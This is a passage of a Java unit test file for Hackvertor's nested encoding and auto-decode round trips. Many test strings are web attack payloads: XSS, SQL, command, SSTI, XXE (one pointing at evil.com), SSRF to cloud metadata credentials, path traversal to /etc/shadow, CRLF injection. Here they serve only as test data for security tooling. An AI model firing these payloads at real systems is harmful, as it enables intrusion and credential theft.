        String encoded = hackvertor.convert("<@utf7>hello + world</@utf7>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@utf7>hello + world</@utf7>", decoded);
    }

    @Test
    void testUtf7ToBase64_2Levels() {
        String encoded = hackvertor.convert("<@utf7><@base64>hello + world</@base64></@utf7>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@utf7><@base64>hello + world</@base64></@utf7>", decoded);
    }

    @Test
    void testHexEscapesToUtf7_2Levels() {
        String encoded = hackvertor.convert("<@hex_escapes><@utf7>hello + world</@utf7></@hex_escapes>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@hex_escapes><@utf7>hello + world</@utf7></@hex_escapes>", decoded);
    }

    @Test
    void testUtf7ToBase64ToBase64_3Levels() {
        String encoded = hackvertor.convert("<@utf7><@base64><@base64>hello + world</@base64></@base64></@utf7>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@utf7><@base64><@base64>hello + world</@base64></@base64></@utf7>", decoded);
    }

    @Test
    void testBase64ToBase64ToBase64ToBase32_4Levels() {
        String encoded = hackvertor.convert("<@base64><@base64><@base64><@base32>foobar</@base32></@base64></@base64></@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64><@base64><@base64><@base32>foobar</@base32></@base64></@base64></@base64>", decoded);
    }

    @Test
    void testBase32ToBase64ToBase64ToBase64_4Levels() {
        String encoded = hackvertor.convert("<@base32><@base64><@base64><@base64>foobar</@base64></@base64></@base64></@base32>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base32><@base64><@base64><@base64>foobar</@base64></@base64></@base64></@base32>", decoded);
    }

    @Test
    void testGzipToBase64ToBase64ToBase64_4Levels() {
        String encoded = hackvertor.convert("<@gzip_compress><@base64><@base64><@base64>foobar</@base64></@base64></@base64></@gzip_compress>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@gzip_compress><@base64><@base64><@base64>foobar</@base64></@base64></@base64></@gzip_compress>", decoded);
    }

    @Test
    void testDeflateToBase64ToBase64ToBase64_4Levels() {
        String encoded = hackvertor.convert("<@deflate_compress><@base64><@base64><@base64>foobar</@base64></@base64></@base64></@deflate_compress>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@deflate_compress><@base64><@base64><@base64>foobar</@base64></@base64></@base64></@deflate_compress>", decoded);
    }

    @Test
    void testHexEntitiesToBase64ToBase64ToBase64_4Levels() {
        String encoded = hackvertor.convert("<@hex_entities><@base64><@base64><@base64>foobar</@base64></@base64></@base64></@hex_entities>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@hex_entities><@base64><@base64><@base64>foobar</@base64></@base64></@base64></@hex_entities>", decoded);
    }

    @Test
    void testUrlencodeToBase64ToBase64ToBase64_4Levels() {
        String encoded = hackvertor.convert("<@urlencode_all><@base64><@base64><@base64>foobar</@base64></@base64></@base64></@urlencode_all>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@urlencode_not_plus><@base64><@base64><@base64>foobar</@base64></@base64></@base64></@urlencode_not_plus>", decoded);
    }

    @Test
    void testBase64XssPayload() {
        String xss = "<script>alert('XSS')</script>";
        String encoded = hackvertor.convert("<@base64>" + xss + "</@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64>" + xss + "</@base64>", decoded);
    }

    @Test
    void testUrlencodeToBase64XssPayload() {
        String xss = "<script>alert('XSS')</script>";
        String encoded = hackvertor.convert("<@urlencode_all><@base64>" + xss + "</@base64></@urlencode_all>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@urlencode_not_plus><@base64>" + xss + "</@base64></@urlencode_not_plus>", decoded);
    }

    @Test
    void testBase64SqlInjection() {
        String sqli = "' OR 1=1--";
        String encoded = hackvertor.convert("<@base64>" + sqli + "</@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64>" + sqli + "</@base64>", decoded);
    }

    @Test
    void testHexEscapesToBase64SqlInjection() {
        String sqli = "'; DROP TABLE users;--";
        String encoded = hackvertor.convert("<@hex_escapes><@base64>" + sqli + "</@base64></@hex_escapes>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@hex_escapes><@base64>" + sqli + "</@base64></@hex_escapes>", decoded);
    }

    @Test
    void testBase64JsonPayload() {
        String json = "{\"user\":\"admin\",\"role\":\"superuser\",\"token\":\"abc123\"}";
        String encoded = hackvertor.convert("<@base64>" + json + "</@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64>" + json + "</@base64>", decoded);
    }

    @Test
    void testGzipToBase64JsonPayload() {
        String json = "{\"username\":\"admin\",\"password\":\"secret123\",\"remember\":true}";
        String encoded = hackvertor.convert("<@gzip_compress><@base64>" + json + "</@base64></@gzip_compress>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@gzip_compress><@base64>" + json + "</@base64></@gzip_compress>", decoded);
    }

    @Test
    void testBase64UrlPath() {
        String url = "https://example.com/api/users?id=1&action=delete";
        String encoded = hackvertor.convert("<@base64>" + url + "</@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64>" + url + "</@base64>", decoded);
    }

    @Test
    void testUrlencodeToBase64UrlPath() {
        String url = "https://target.com/admin/config.php?debug=true";
        String encoded = hackvertor.convert("<@urlencode_all><@base64>" + url + "</@base64></@urlencode_all>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@urlencode_not_plus><@base64>" + url + "</@base64></@urlencode_not_plus>", decoded);
    }

    @Test
    void testBase64CommandInjection() {
        String cmd = "; cat /etc/passwd";
        String encoded = hackvertor.convert("<@base64>" + cmd + "</@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64>" + cmd + "</@base64>", decoded);
    }

    @Test
    void testUnicodeEscapesToBase64CommandInjection() {
        String cmd = "| ls -la /var/www/html";
        String encoded = hackvertor.convert("<@unicode_escapes><@base64>" + cmd + "</@base64></@unicode_escapes>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@unicode_escapes><@base64>" + cmd + "</@base64></@unicode_escapes>", decoded);
    }

    @Test
    void testBase64LdapInjection() {
        String ldap = "*)(&(objectClass=*)(uid=admin))";
        String encoded = hackvertor.convert("<@base64>" + ldap + "</@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64>" + ldap + "</@base64>", decoded);
    }

    @Test
    void testBase64XpathInjection() {
        String xpath = "' or '1'='1";
        String encoded = hackvertor.convert("<@base64>" + xpath + "</@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64>" + xpath + "</@base64>", decoded);
    }

    @Test
    void testBase64SstiPayload() {
        String ssti = "{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}";
        String encoded = hackvertor.convert("<@base64>" + ssti + "</@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64>" + ssti + "</@base64>", decoded);
    }

    @Test
    void testHexEscapesToBase64SstiPayload() {
        String ssti = "${7*7}";
        String encoded = hackvertor.convert("<@hex_escapes><@base64>" + ssti + "</@base64></@hex_escapes>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@hex_escapes><@base64>" + ssti + "</@base64></@hex_escapes>", decoded);
    }

    @Test
    void testBase64XxePayload() {
        String xxe = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>";
        String encoded = hackvertor.convert("<@base64>" + xxe + "</@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64><@html_entities>" + xxe + "</@html_entities></@base64>", decoded);
    }

    @Test
    void testDeflateToBase64XxePayload() {
        String xxe = "<!DOCTYPE test [<!ENTITY % remote SYSTEM \"http://evil.com/xxe.dtd\">%remote;]>";
        String encoded = hackvertor.convert("<@deflate_compress><@base64>" + xxe + "</@base64></@deflate_compress>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@deflate_compress><@base64>" + xxe + "</@base64></@deflate_compress>", decoded);
    }

    @Test
    void testBase64HttpHeader() {
        String header = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9";
        String encoded = hackvertor.convert("<@base64>" + header + "</@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64>" + header + "</@base64>", decoded);
    }

    @Test
    void testUrlencodeToBase64Cookie() {
        String cookie = "session=abc123; admin=true; Path=/; HttpOnly";
        String encoded = hackvertor.convert("<@urlencode_all><@base64>" + cookie + "</@base64></@urlencode_all>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@urlencode_not_plus><@base64>" + cookie + "</@base64></@urlencode_not_plus>", decoded);
    }

    @Test
    void testBase64CsrfToken() {
        String csrf = "csrf_token=a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6";
        String encoded = hackvertor.convert("<@base64>" + csrf + "</@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64>" + csrf + "</@base64>", decoded);
    }

    @Test
    void testBase64HtmlInjection() {
        String html = "<img src=x onerror=\"alert(document.domain)\">";
        String encoded = hackvertor.convert("<@base64>" + html + "</@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64>" + html + "</@base64>", decoded);
    }

    @Test
    void testHexEntitiesToBase64HtmlInjection() {
        String html = "<svg onload=alert(1)>";
        String encoded = hackvertor.convert("<@hex_entities><@base64>" + html + "</@base64></@hex_entities>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@hex_entities><@base64>" + html + "</@base64></@hex_entities>", decoded);
    }

    @Test
    void testBase64OpenRedirect() {
        String redirect = "//evil.com/phish?target=https://bank.com";
        String encoded = hackvertor.convert("<@base64>" + redirect + "</@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64>" + redirect + "</@base64>", decoded);
    }

    @Test
    void testUrlencodeToBase64Ssrf() {
        String ssrf = "http://169.254.169.254/latest/meta-data/iam/security-credentials/";
        String encoded = hackvertor.convert("<@urlencode_all><@base64>" + ssrf + "</@base64></@urlencode_all>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@urlencode_not_plus><@base64>" + ssrf + "</@base64></@urlencode_not_plus>", decoded);
    }

    @Test
    void testBase64PathTraversal() {
        String path = "../../../etc/passwd";
        String encoded = hackvertor.convert("<@base64>" + path + "</@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64>" + path + "</@base64>", decoded);
    }

    @Test
    void testOctalEscapesToBase64PathTraversal() {
        String path = "....//....//....//etc/shadow";
        String encoded = hackvertor.convert("<@octal_escapes><@base64>" + path + "</@base64></@octal_escapes>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@octal_escapes><@base64>" + path + "</@base64></@octal_escapes>", decoded);
    }

    @Test
    void testBase64NoSqlInjection() {
        String nosql = "{\"$gt\":\"\"}";
        String encoded = hackvertor.convert("<@base64>" + nosql + "</@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64>" + nosql + "</@base64>", decoded);
    }

    @Test
    void testGzipToBase64NoSqlInjection() {
        String nosql = "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}";
        String encoded = hackvertor.convert("<@gzip_compress><@base64>" + nosql + "</@base64></@gzip_compress>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@gzip_compress><@base64>" + nosql + "</@base64></@gzip_compress>", decoded);
    }

    @Test
    void testBase64GraphqlInjection() {
        String graphql = "{__schema{types{name,fields{name}}}}";
        String encoded = hackvertor.convert("<@base64>" + graphql + "</@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64>" + graphql + "</@base64>", decoded);
    }

    @Test
    void testBase64JwtPayload() {
        String jwtPayload = "{\"sub\":\"admin\",\"iat\":1516239022,\"exp\":9999999999,\"role\":\"admin\"}";
        String encoded = hackvertor.convert("<@base64>" + jwtPayload + "</@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64>" + jwtPayload + "</@base64>", decoded);
    }

    @Test
    void testBase64ToBase64XssInJson() {
        String payload = "{\"name\":\"<script>alert(document.cookie)</script>\"}";
        String encoded = hackvertor.convert("<@base64><@base64>" + payload + "</@base64></@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64><@base64>" + payload + "</@base64></@base64>", decoded);
    }

    @Test
    void testUrlencodeToBase64ToBase64DeepNested() {
        String payload = "{\"redirect\":\"javascript:alert(origin)\"}";
        String encoded = hackvertor.convert("<@urlencode_all><@base64><@base64>" + payload + "</@base64></@base64></@urlencode_all>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@urlencode_not_plus><@base64><@base64>" + payload + "</@base64></@base64></@urlencode_not_plus>", decoded);
    }

    @Test
    void testHexEscapesToBase64ToBase64SqlUnion() {
        String sqli = "' UNION SELECT username,password FROM users--";
        String encoded = hackvertor.convert("<@hex_escapes><@base64><@base64>" + sqli + "</@base64></@base64></@hex_escapes>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@hex_escapes><@base64><@base64>" + sqli + "</@base64></@base64></@hex_escapes>", decoded);
    }

    @Test
    void testBase64AwsCredentials() {
        String creds = "aws_access_key_id=AKIAIOSFODNN7EXAMPLE\naws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";
        String encoded = hackvertor.convert("<@base64>" + creds + "</@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64>" + creds + "</@base64>", decoded);
    }

    @Test
    void testGzipToBase64LargePayload() {
        String payload = "SELECT * FROM users WHERE id=1; SELECT * FROM admin_users; SELECT * FROM secrets; SELECT * FROM api_keys; SELECT * FROM sessions WHERE active=1;";
        String encoded = hackvertor.convert("<@gzip_compress><@base64>" + payload + "</@base64></@gzip_compress>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@gzip_compress><@base64>" + payload + "</@base64></@gzip_compress>", decoded);
    }

    @Test
    void testBase64PrototypePollution() {
        String payload = "{\"__proto__\":{\"admin\":true}}";
        String encoded = hackvertor.convert("<@base64>" + payload + "</@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64>" + payload + "</@base64>", decoded);
    }

    @Test
    void testCssEscapesToBase64PrototypePollution() {
        String payload = "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}";
        String encoded = hackvertor.convert("<@css_escapes><@base64>" + payload + "</@base64></@css_escapes>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@css_escapes><@base64>" + payload + "</@base64></@css_escapes>", decoded);
    }

    @Test
    void testBase64DeserializationPayload() {
        String payload = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==";
        String encoded = hackvertor.convert("<@base64>" + payload + "</@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64>" + payload + "</@base64>", decoded);
    }

    @Test
    void testBase64RegexDos() {
        String payload = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!";
        String encoded = hackvertor.convert("<@base64>" + payload + "</@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64>" + payload + "</@base64>", decoded);
    }

    @Test
    void testBase32ToGzipXmlPayload() {
        String xml = "<?xml version=\"1.0\"?><root><user>admin</user><pass>password123</pass></root>";
        String encoded = hackvertor.convert("<@base32><@gzip_compress>" + xml + "</@gzip_compress></@base32>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base32><@gzip_compress>" + xml + "</@gzip_compress></@base32>", decoded);
    }

    @Test
    void testBase64HostHeaderInjection() {
        String header = "Host: evil.com\r\nX-Forwarded-Host: attacker.com";
        String encoded = hackvertor.convert("<@base64>" + header + "</@base64>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@base64>" + header + "</@base64>", decoded);
    }

    @Test
    void testUnicodeEscapesToBase64CrlfInjection() {
        String crlf = "header\r\nSet-Cookie: session=hijacked";
        String encoded = hackvertor.convert("<@unicode_escapes><@base64>" + crlf + "</@base64></@unicode_escapes>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@unicode_escapes><@base64>" + crlf + "</@base64></@unicode_escapes>", decoded);
    }

    @Test
    void testAsciiHexNoSpaceToGzip_2Levels() {
        String encoded = hackvertor.convert("<@ascii2hex('')><@gzip_compress>foobar</@gzip_compress></@ascii2hex>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@ascii2hex(\"\")><@gzip_compress>foobar</@gzip_compress></@ascii2hex>", decoded);
    }

    @Test
    void testAsciiHexNoSpaceToBase64_2Levels() {
        String encoded = hackvertor.convert("<@ascii2hex('')><@base64>foobar</@base64></@ascii2hex>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@ascii2hex(\"\")><@base64>foobar</@base64></@ascii2hex>", decoded);
    }

    @Test
    void testAsciiHexNoSpaceToDeflate_2Levels() {
        String encoded = hackvertor.convert("<@ascii2hex('')><@deflate_compress>foobar</@deflate_compress></@ascii2hex>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@ascii2hex(\"\")><@deflate_compress>foobar</@deflate_compress></@ascii2hex>", decoded);
    }

    @Test
    void testAsciiHexNoSpaceToBase32ToGzip_3Levels() {
        String encoded = hackvertor.convert("<@ascii2hex('')><@base32><@gzip_compress>foobar</@gzip_compress></@base32></@ascii2hex>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@ascii2hex(\"\")><@base32><@gzip_compress>foobar</@gzip_compress></@base32></@ascii2hex>", decoded);
    }

    @Test
    void testAsciiHexNoSpaceJsonPayload() {
        String json = "{\"stockApi\": \"http://api.weliketoshop.net:8080/product/stock/check?productId=test&storeId=test\"}";
        String encoded = hackvertor.convert("<@ascii2hex('')><@gzip_compress>" + json + "</@gzip_compress></@ascii2hex>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@ascii2hex(\"\")><@gzip_compress>" + json + "</@gzip_compress></@ascii2hex>", decoded);
    }

    @Test
    void testAsciiHexSpaceJsonPayload() {
        String json = "{\"stockApi\": \"http://api.weliketoshop.net:8080/product/stock/check?productId=test&storeId=test\"}";
        String encoded = hackvertor.convert("<@ascii2hex(' ')><@gzip_compress>" + json + "</@gzip_compress></@ascii2hex>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@ascii2hex(\" \")><@gzip_compress>" + json + "</@gzip_compress></@ascii2hex>", decoded);
    }

    @Test
    void testAsciiHexNoSpaceSimpleString() {
        String input = "hello world";
        String encoded = hackvertor.convert("<@ascii2hex('')>" + input + "</@ascii2hex>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@ascii2hex(\"\")>" + input + "</@ascii2hex>", decoded);
    }

    @Test
    void testAsciiHexSpaceSimpleString() {
        String input = "hello world";
        String encoded = hackvertor.convert("<@ascii2hex(' ')>" + input + "</@ascii2hex>", hackvertor);
        String decoded = hackvertor.convert("<@auto_decode_no_decrypt>" + encoded + "</@auto_decode_no_decrypt>", hackvertor);
        assertEquals("<@ascii2hex(\" \")>" + input + "</@ascii2hex>", decoded);
    }
}
